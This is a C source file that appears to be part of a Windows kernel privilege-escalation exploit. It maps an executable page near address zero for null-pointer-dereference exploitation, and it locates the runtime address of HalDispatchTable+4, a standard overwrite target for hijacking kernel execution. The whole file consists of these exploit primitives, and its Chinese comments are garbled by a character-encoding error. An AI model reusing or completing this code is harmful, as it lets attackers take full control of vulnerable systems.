#include "base.h"
#pragma comment(linker, "/default:ntdll.lib")

#define PAGE_SIZE 0x1000
#define KERNEL_NAME_LENGTH 0X0D

BOOL AllocateZeroMemory()
{
	NTSTATUS status = STATUS_SUCCESS;
	PVOID pZeroAddress = NULL;
	DWORD dwZeroSize = PAGE_SIZE;
	BOOL bRet = TRUE;

	// ���0��ַ���ڴ�
	pZeroAddress = (PVOID)sizeof(ULONG);
	status = NtAllocateVirtualMemory(NtCurrentProcess(),
									 &pZeroAddress,
									 0,
									 &dwZeroSize,
									 MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN,
									 PAGE_EXECUTE_READWRITE);
	if (!NT_SUCCESS(status))
	{
		ShowError("NtAllocateVirtualMemory", status);
		bRet = FALSE;
		goto exit;
	}


exit:
	return bRet;
}

PVOID GetHalDispatchTable()
{
	NTSTATUS status = STATUS_SUCCESS;
	DWORD dwReturnLength = 0;
	PSYSTEM_MODULE_INFORMATION pModuleInformation = NULL;
	DWORD dwImageBase = 0;
	PVOID pMappedBase = NULL;
	UCHAR szImageName[KERNEL_NAME_LENGTH] = { 0 };
	UNICODE_STRING uDllName;
	PVOID pHalDispatchTable = NULL, pXHalQuerySystemInformation = NULL;
	DWORD dwDllCharacteristics = DONT_RESOLVE_DLL_REFERENCES;


	// ��ʱdwReturnLength��0�����Ժ��������ڳ���Ϊ0ִ��ʧ��
	// Ȼ��ϵͳ���ڵ��ĸ�����ָ���ĵ�ַ������Ҫ���ڴ��С
	status = ZwQuerySystemInformation(SystemModuleInformation,
									  pModuleInformation,
									  dwReturnLength,
		                              &dwReturnLength);

	if (status != STATUS_INFO_LENGTH_MISMATCH)
	{
		ShowError("ZwQuerySystemInformation", status);
		goto exit;
	}

	// ��ҳ��С����
	dwReturnLength = (dwReturnLength & 0xFFFFF000) + PAGE_SIZE * sizeof(ULONG);
	pModuleInformation = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(NULL,
																  dwReturnLength,
																  MEM_COMMIT | MEM_RESERVE,
																  PAGE_READWRITE);
	if (!pModuleInformation)
	{
		printf("VirtualAlloc Error");
		goto exit;
	}

	status = ZwQuerySystemInformation(SystemModuleInformation,
									  pModuleInformation,
									  dwReturnLength,
									  &dwReturnLength);
	if (!NT_SUCCESS(status))
	{
		ShowError("ZwQuerySystemInformation", status);
		goto exit;
	}

	// ģ����صĻ���ַ
	dwImageBase = (DWORD)(pModuleInformation->Module[0].Base);

	// ��ȡģ����
	RtlMoveMemory(szImageName,
		(PVOID)(pModuleInformation->Module[0].ImageName + pModuleInformation->Module[0].PathLength),
		KERNEL_NAME_LENGTH);
	// ת��ΪUNICODE_STRING����
	RtlCreateUnicodeStringFromAsciiz(&uDllName, (PUCHAR)szImageName);

	status = (NTSTATUS)LdrLoadDll(NULL,
								  &dwDllCharacteristics,
								  &uDllName,
								  &pMappedBase);

	if (!NT_SUCCESS(status))
	{
		ShowError("LdrLoadDll", status);
		goto exit;
	}

	// ��ȡ�ں�HalDispatchTable��������ַ
	pHalDispatchTable = GetProcAddress((HMODULE)pMappedBase, "HalDispatchTable");

	if (pHalDispatchTable == NULL)
	{
		printf("GetProcAddress Error\n");
		goto exit;
	}

	pHalDispatchTable = (PVOID)((DWORD)pHalDispatchTable - (DWORD)pMappedBase + dwImageBase);
	pXHalQuerySystemInformation = (PVOID)((DWORD)pHalDispatchTable + sizeof(ULONG));

exit:
	if (pModuleInformation)
	{
		VirtualFree(pModuleInformation,
					dwReturnLength,
					MEM_DECOMMIT | MEM_RELEASE);
	}
	if (pMappedBase)
	{
		LdrUnloadDll(pMappedBase);
	}

	return pXHalQuerySystemInformation;
}

void ShowError(char *msg, DWORD dwErrorCode)
{
	printf("%s Error 0x%X\n", msg, dwErrorCode);
}